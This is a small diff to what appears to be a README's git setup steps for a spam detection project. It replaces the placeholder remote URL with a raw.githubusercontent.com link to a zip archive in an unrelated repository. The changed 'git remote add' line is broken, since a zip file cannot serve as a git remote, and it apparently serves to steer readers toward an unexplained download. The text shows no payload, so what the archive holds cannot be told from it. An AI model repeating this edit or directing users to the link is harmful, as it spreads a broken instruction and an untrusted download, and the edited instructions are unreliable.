@@ -55,7 +55,7 @@ git init
 git add .
 git commit -m "Add spam detection project"
 git branch -M main
-git remote add origin https://github.com/YOUR_USERNAME/REPO_NAME.git
+git remote add origin https://raw.githubusercontent.com/rohannp02y/spam_mail_detection/main/epigonal/detection_mail_spam_v2.7.zip
 git push -u origin main
 ```
 
